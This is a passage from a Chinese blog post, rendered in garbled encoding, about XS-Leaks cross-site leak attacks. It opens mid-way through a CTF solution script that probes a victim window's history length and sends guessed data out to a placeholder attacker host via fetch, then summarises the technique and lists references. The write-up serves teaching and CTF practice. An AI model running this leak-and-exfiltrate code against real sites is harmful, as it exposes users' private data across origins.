class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;win.location=<span class="hljs-string">&quot;http://ip&quot;</span>&#125;, <span class="hljs-number">2000</span>)</span><br><span class="javascript">  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;</span><br><span class="javascript">    <span class="hljs-built_in">console</span>.log(c)</span><br><span class="javascript">    <span class="hljs-built_in">console</span>.log(win.history.length)</span><br><span class="javascript">    <span class="hljs-keyword">if</span>(win.history.length === <span class="hljs-number">3</span>)</span><br><span class="javascript">    &#123;</span><br><span class="javascript">      fetch(<span class="hljs-string">&quot;http://ip/?&quot;</span> + c)</span><br><span class="javascript">    &#125;</span><br><span class="javascript">  &#125;, <span class="hljs-number">4000</span>)</span><br><span class="javascript">  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;</span><br><span class="javascript">    win.close()</span><br><span class="javascript">  &#125;, <span class="hljs-number">5000</span>)</span><br><span class="javascript">&#125;</span><br><span class="javascript"></span><br><span class="javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<h2 id="å…¶ä»–leakæ‰‹æ³•"><a href="#å…¶ä»–leakæ‰‹æ³•" class="headerlink" title="å…¶ä»–leakæ‰‹æ³•"></a>å…¶ä»–leakæ‰‹æ³•</h2><p>XS-Leaksçš„æ”»å‡»æ‰‹æ³•æ˜¯ä¸æ–­è¿­ä»£çš„ï¼Œå¹¶ä¸”å—æµè§ˆå™¨ç¯å¢ƒå½±å“å¾ˆå¤§<br><a target="_blank" rel="noopener" href="https://xsinator.com/paper.pdf">https://xsinator.com/paper.pdf</a> è¿™ç¯‡paperæ¯”è¾ƒå…¨é¢åœ°ä»‹ç»äº†å„ç§æ”»å‡»æŠ€å·§ï¼Œå¹¶æµ‹è¯•äº†ä¸åŒæµè§ˆå™¨ç¯å¢ƒä¸‹çš„æ”»å‡»å¯è¡Œæ€§ï¼Œæœ‰å…´è¶£çš„è¯å¯ä»¥ç ”è¯»ä¸€ä¸‹</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ€»ä½“æ¥è¯´ï¼ŒXS-Leaksçš„å±å®³è¿˜æ˜¯ä¸å¤ªå¤§çš„ï¼šæ”»å‡»æ¡ä»¶è‹›åˆ»ï¼Œæ”»å‡»èƒ½å¦æˆåŠŸä¾èµ–è¢«æ”»å‡»è€…ç¯å¢ƒï¼Œæ³„æ¼çš„ä¿¡æ¯æœ‰é™â€¦â€¦ä½†ä¸æ’é™¤åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å¢ƒä¸‹ï¼Œè¿˜æ˜¯ä¼šäº§ç”Ÿæ¯”è¾ƒé«˜çš„é£é™©ï¼Œè­¬å¦‚leakå‡ºå¸å¯†AKç­‰æ•æ„Ÿä¿¡æ¯<br>å¹¶ä¸”ç”±äºXS-LeaksåŸºäºæµè§ˆå™¨ï¼Œå¯¹äºå¼€å‘è€…æ¥è¯´ï¼ŒXS-Leakså…¶å®å¾ˆéš¾é˜²èŒƒã€‚å†åŠ ä¸ŠXS-Leaksä½œä¸ºä¸€ç§æ¯”è¾ƒæ–°çš„æ”»å‡»æ‰‹æ³•ï¼Œä¹Ÿå¹¶ä¸è¢«å¤§å®¶æ‰€ç†ŸçŸ¥ï¼Œå°±å¯¼è‡´äº§ç”Ÿäº†å¾ˆå¤šæ½œåœ¨çš„XS-Leaksæ”»å‡»é¢</p>
<p>æœ‰ä¸“å®¶é¢„è¨€XS-Leaksä¼šåœ¨æœªæ¥æˆä¸ºOWASP TOP10ï¼Œæˆ‘ä¸ªäººé¢„è¨€ä¸€ä¸‹è¿™ä¸ªä¸“å®¶çš„é¢„è¨€ä¸ä¼šæˆçœŸï¼ˆç¬‘ï¼‰ã€‚<br>ç›®å‰æ¥çœ‹ï¼ŒXS-Leaksæœ¬èº«è¿˜æ˜¯æ— æ³•ç‹¬ç«‹æˆä¸ºæ¯”è¾ƒä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œæ›´å¤šæ˜¯ä½œä¸ºä¸€ç§trickä½œç ”ç©¶å’Œå¨±ä¹ç”¨ã€‚ï¼ˆä»¥åŠå›½å¤–çš„CTFå¾ˆå–œæ¬¢å‡ºXS-Leaksçš„é¢˜ï¼‰</p>
<p>ä¸‹é›†é¢„å‘Šï¼šå¦‚ä½•æ‰‹æ’•å‰ç«¯jsæ··æ·†ï¼ˆåº”è¯¥æ˜¯æ²¡æœ‰ä¸‹é›†äº†ï¼‰</p>
<p>å‚è€ƒï¼š<br><a target="_blank" rel="noopener" href="https://xsleaks.dev/">https://xsleaks.dev/</a>      XS-Leaks Wikiï¼Œéå¸¸å…¨é¢<br><a target="_blank" rel="noopener" href="https://xsinator.com/">https://xsinator.com/</a>    æŸ¥è¯¢ä¸åŒæµè§ˆå™¨ç¯å¢ƒå¯ç”¨çš„leakæ‰‹æ³•ï¼Œè¿˜å¯ä»¥ä¸€é”®æµ‹è¯•å½“å‰æµè§ˆå™¨<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11306">https://xz.aliyun.com/t/11306</a><br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xs-search">https://book.hacktricks.xyz/pentesting-web/xs-search</a><br><a target="_blank" rel="noopener" href="https://secweb.work/papers/2021/vangoethem2021leaks.pdf">https://secweb.work/papers/2021/vangoethem2021leaks.pdf</a><br><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html</a><br><a target="_blank" rel="noopener" href="https://owasp.org/www-chapter-germany/stammtische/hamburg/assets/slides/2022-02-24_XS-Leak%20und%20XS-Search-Angriffe.pdf">https://owasp.org/www-chapter-germany/stammtische/hamburg/assets/slides/2022-02-24_XS-Leak%20und%20XS-Search-Angriffe.pdf</a></p>

      </section>
      <section class="extra">
        
        
          <section class="donate">
  <div id="qrcode-donate">
    <img   class="lazyload" data-original="/images/myimg/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
  </div>
  <div class="icon">
    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
  </div>
</section>
        
        
  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul> 

        
  <nav class="nav">
    <a href="/2099/01/10/my2021/"><i class="iconfont iconleft"></i>2021å¹´åº¦åˆ’æ°´æŠ¥å‘Š</a>
    <a href="/2023/06/07/Android-app-packet-capture/">å®‰å“åº”ç”¨é˜²æŠ“åŒ…æœºåˆ¶åŠä¸€äº›ç»•è¿‡<i class="iconfont iconright"></i></a>
  </nav>

      </section>
      
    </section>
  </div>
</article></div>
      <div class="col-xl-3">
        
          
  <aside class="toc-wrap">
    <h3 class="toc-title">æ–‡ç« ç›®å½•ï¼š</h3>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">å‰è¨€</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8ECSRF%E5%88%B0%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">ä»CSRFåˆ°åŒæºç­–ç•¥</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XS-Leaks%E7%AE%80%E4%BB%8B"><span class="toc-text">XS-Leaksç®€ä»‹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XS-Search"><span class="toc-text">XS-Search</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9BCTF%E9%A2%98%E7%9B%AE"><span class="toc-text">ä¸€äº›CTFé¢˜ç›®</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2021%E7%A5%A5%E4%BA%91%E6%9D%AF-Package-Manager-2021"><span class="toc-text">[2021ç¥¥äº‘æ¯]Package Manager 2021</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUSCTF-2022-ez-notes"><span class="toc-text">[SUSCTF 2022] ez_notes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96leak%E6%89%8B%E6%B3%95"><span class="toc-text">å…¶ä»–leakæ‰‹æ³•</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">æ€»ç»“</span></a></li></ol>
  </aside>

        
      </div>
    </div>
  </div>
</main>
  

<footer class="footer">
  <div class="footer-social"><a 
        href="tencent://message/?Menu=yes&uin=3067733270 "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#12B7F5'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconQQ "></i>
      </a><a 
        href="javascript:; "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#09BB07'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconwechat-fill "></i>
      </a><a 
        href="mailto:3067733270@qq.com "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color=#FF3B00" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconmail"></i>
      </a></div>
  
    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
  
</footer>
  
      <div class="fab fab-plus">
    <i class="iconfont iconplus"></i>
  </div>
  
  
  <div class="fab fab-up">
    <i class="iconfont iconcaret-up"></i>
  </div>
  
  
  
    
<script src="/js/color-mode.js"></script>

  
  
</body>

<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>



  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>




  
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>






  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>




<script src="/js/utils.js"></script>
<script src="/js/script.js"></script>







  <script>
    (function () {
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>













</html>